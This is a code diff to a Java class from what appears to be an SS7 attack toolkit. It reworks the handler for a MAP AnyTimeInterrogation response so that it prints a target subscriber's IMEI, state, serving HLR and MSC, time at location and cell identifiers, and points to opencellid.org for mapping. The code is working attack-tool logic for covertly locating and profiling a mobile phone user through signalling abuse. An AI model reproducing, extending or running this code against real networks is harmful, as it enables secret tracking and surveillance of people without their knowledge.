@@ -546,67 +546,97 @@ public class AnyTimeInterrogationReq extends ATILowLevel {
 
     @Override
     public void onAnyTimeInterrogationResponse(AnyTimeInterrogationResponse anyTimeInterrogationResponse) {
+        System.out.println("******* Target's Info and Location *******");
+        String imei = "";
+        String cs_state = "";
+        String hlr = "";
         try {
 
-            String imei = anyTimeInterrogationResponse.getSubscriberInfo().getIMEI().getIMEI();
+            imei = anyTimeInterrogationResponse.getSubscriberInfo().getIMEI().getIMEI();
 
-            String cs_state = anyTimeInterrogationResponse.getSubscriberInfo().getSubscriberState().getSubscriberStateChoice().name();
+            cs_state = anyTimeInterrogationResponse.getSubscriberInfo().getSubscriberState().getSubscriberStateChoice().name();
 
-            int aol = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getAgeOfLocationInformation();
-            int mcc = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMCC();
-            int mnc = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMNC();
-            int lac = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getLac();
-            int ci = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getCellIdOrServiceAreaCode();
+            hlr = anyTimeInterrogationResponse.getMAPDialog().getRemoteAddress().getGlobalTitle().getDigits();
 
-            String hlr = anyTimeInterrogationResponse.getMAPDialog().getRemoteAddress().getGlobalTitle().getDigits();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
+        if (imei.isEmpty()) {
+            System.out.println("\033[31m[-]\033[0mNo Info returned for the IMEI parameter");
+        } else {
+            System.out.println("\033[32m[+]\033[0mIMEI:\033[31m " + imei);
+        }
 
-            String Vmsc = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getVlrNumber().getAddress();
+        if (cs_state.length()==0) {
+            System.out.println("\033[31m[-]\033[0mNo Info returned for Targer State");
+        } else {
+            System.out.println("\033[32m[+]\033[0mTarget's State:\033[31m " + cs_state);
+        }
+        System.out.println("\033[32m[+]\033[0mTarget is stored in HLR:\033[31m "+ hlr+"\033[0m");
 
+        try {
 
+            if (anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation() != null) {
+                int aol = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getAgeOfLocationInformation();
+                String Vmsc = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getVlrNumber().getAddress();
+                System.out.println("\033[32m[+]\033[0mTarget is in this location for:\033[31m " + Integer.toString(aol) + " minutes");
+                if (Vmsc.length() == 0) {
+                    System.out.println("\033[32m[-]\033[0mNo Info returned for the parameter MSC");
+                } else {
+                    System.out.println("\033[32m[+]\033[0mTarget is served by the MSC:\033[31m " + Vmsc);
+                }
 
-            System.out.println("******* Target's Info and Location *******");
+                if (anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                        .getCellGlobalIdOrServiceAreaIdOrLAI() == null ) {
+                    System.out.println("\033[31m[-]\033[0mNo Info returned for the Cell Global ID parameter");
+                } else {
+                    if (anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                            .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength() != null) {
 
-            if (imei.isEmpty()) {
-                System.out.println("\033[31m[-]\033[0mNo Info returned for the IMEI parameter");
+                        int mcc = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMCC();
+                        int mnc = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMNC();
+                        int lac = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getLac();
+                        int ci = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
+                                .getCellIdOrServiceAreaCode();
+                        System.out.println("\033[32m[+]\033[0mCellID:\033[31mMCC(" + Integer.toString(mcc) + ")" + "MNC("
+                                + Integer.toString(mnc) + ")" + "LAC(" + Integer.toString(lac) + ")" + "CI("
+                                + Integer.toString(ci) + ")" + "\tCheck it out on opencellid.org");
+                    }
+                    if (anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                            .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength() != null) {
+
+                        int mccLai = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getMCC();
+                        int mncLai = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getMNC();
+                        int lacLai = anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getLac();
+
+                        System.out.println("\033[32m[+]\033[0mLAI:\033[31mLAIMCC(" + Integer.toString(mccLai) + ")"
+                                + "LAIMNC(" + Integer.toString(mncLai) + ")" + "LAILAC(" + Integer.toString(lacLai) + ")");
+                    }
+                }
+
             } else {
-                System.out.println("\033[32m[+]\033[0mIMEI:\033[31m " + imei);
+                System.out.println("\033[31m[-]\033[0mCellID: No LocationInfo returned for the Cell Global ID parameter");
             }
-
-            if (cs_state.length()==0) {
-                System.out.println("\033[31m[-]\033[0mNo Info returned for Targer State");
-            } else {
-                System.out.println("\033[32m[+]\033[0mTarget's State:\033[31m " + cs_state);
-            }
-
-
-            System.out.println("\033[32m[+]\033[0mTarget is in this location for:\033[31m " + Integer.toString(aol) +" minutes");
-
-
-            if(anyTimeInterrogationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().toString().length()==0){
-                System.out.println("\033[31m[-]\033[0mNo Info returned for the Cell Global ID parameter");
-            }else{
-                System.out.println("\033[32m[+]\033[0mCellID:\033[31mMCC(" +Integer.toString(mcc)+")" +"MNC("+ Integer.toString(mnc)+")"
-                        +"LAC(" +Integer.toString(lac)+")" +"CI("+Integer.toString(ci)+")"+"\tCheck it out on opencellid.org");
-            }
-
-            if (Vmsc.length()==0) {
-                System.out.println("\033[32m[-]\033[0mNo Info returned for the parameter MSC");
-            }else{
-                System.out.println("\033[32m[+]\033[0mTarget is served by the MSC:\033[31m "+ Vmsc);
-            }
-
-            System.out.println("\033[32m[+]\033[0mTarget is stored in HLR:\033[31m "+ hlr+"\033[0m");
-            System.out.println("\033[34m[*]\033[0mClosing Session...");
-            Thread.sleep(10000);
-            System.exit(0);
-
-
 
         } catch (Exception e) {
             System.out.println("\033[31m[-]\033[0mError Retrieving Information:  " + e.getMessage());
             System.exit(17);
         }
+        System.out.println("\033[34m[*]\033[0mClosing Session...");
+        try {
+            Thread.sleep(10000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        System.exit(0);
 
     }
 
